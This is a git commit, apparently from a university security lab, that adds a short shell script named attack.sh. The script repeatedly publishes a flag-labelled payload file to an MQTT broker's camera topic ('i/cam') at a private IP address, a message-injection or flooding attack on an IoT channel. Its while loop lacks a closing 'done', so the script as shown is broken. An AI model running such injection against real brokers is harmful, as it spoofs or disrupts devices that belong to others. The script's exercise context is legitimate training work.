1c6dc2778e574c99e01af091db2f7d2fdaa76cbf
r00tpl4nt3r <urregdie@b-tu.de>
2025-06-15 13:28:26 +0200

    attack.sh

---
+++ security/case5/attack.sh
@@ -0,0 +1,19 @@
+#!/bin/sh
+#do in an endless loop
+while true; do
+  #publish the payload to the MQTT broker
+  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1
+  #wait 1 second
+  sleep 1
+  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1
+  #wait 1 second
+  sleep 1
+  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1
+  #wait 1 second
+  sleep 1
+  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1
+  #wait 1 second
+  sleep 1
+
+
+
